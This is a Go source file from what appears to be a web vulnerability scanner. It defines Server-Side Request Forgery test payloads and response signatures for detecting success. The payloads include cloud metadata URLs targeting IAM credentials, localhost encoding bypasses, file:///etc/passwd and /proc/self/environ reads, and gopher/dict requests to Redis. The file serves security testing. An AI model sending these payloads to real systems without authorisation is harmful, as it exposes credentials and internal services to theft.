package scanner

// SSRF testing category.
const CategorySSRF Category = "SSRF"

func init() {
	CategoryMeta[CategorySSRF] = struct {
		Name     string
		Severity Severity
	}{"Server-Side Request Forgery", SeverityCritical}

	Payloads[CategorySSRF] = ssrfPayloads
}

var ssrfPayloads = []string{
	// AWS metadata
	`http://169.254.169.254/latest/meta-data/`,
	`http://169.254.169.254/latest/meta-data/iam/security-credentials/`,
	`http://169.254.169.254/latest/user-data/`,
	// GCP metadata
	`http://metadata.google.internal/computeMetadata/v1/`,
	// Azure metadata
	`http://169.254.169.254/metadata/instance?api-version=2021-02-01`,
	// Internal services
	`http://localhost/`,
	`http://localhost:80/`,
	`http://localhost:8080/`,
	`http://localhost:3000/`,
	`http://localhost:22/`,
	`http://127.0.0.1/`,
	`http://0.0.0.0/`,
	`http://[::1]/`,
	// Bypass variations
	`http://0177.0.0.1/`,              // Octal
	`http://2130706433/`,              // Decimal
	`http://0x7f.0x0.0x0.0x1/`,       // Hex
	`http://127.1/`,                    // Short form
	`http://localhost%00@evil.com/`,    // Null byte
	// DNS rebinding
	`http://localtest.me/`,
	`http://spoofed.burpcollaborator.net/`,
	// File protocol
	`file:///etc/passwd`,
	`file:///etc/hosts`,
	`file:///proc/self/environ`,
	// Dict protocol
	`dict://localhost:6379/INFO`,
	`gopher://localhost:6379/_INFO`,
}

// ssrfSignatures are patterns in the response that indicate a successful SSRF.
var ssrfSignatures = []string{
	// AWS metadata
	"ami-id",
	"instance-id",
	"security-credentials",
	"iam/",
	// Internal pages
	"apache",
	"nginx",
	"<title>",
	"welcome to",
	// /etc/passwd
	"root:x:",
	"root:*:",
	"daemon:",
	// SSH banner
	"ssh-",
	"openssh",
	// Redis
	"redis_version",
	"connected_clients",
	// Error messages revealing SSRF
	"connection refused",
	"could not connect",
	"getaddrinfo",
	"name or service not known",
}

func init() {
	errorSignatures[CategorySSRF] = ssrfSignatures
}
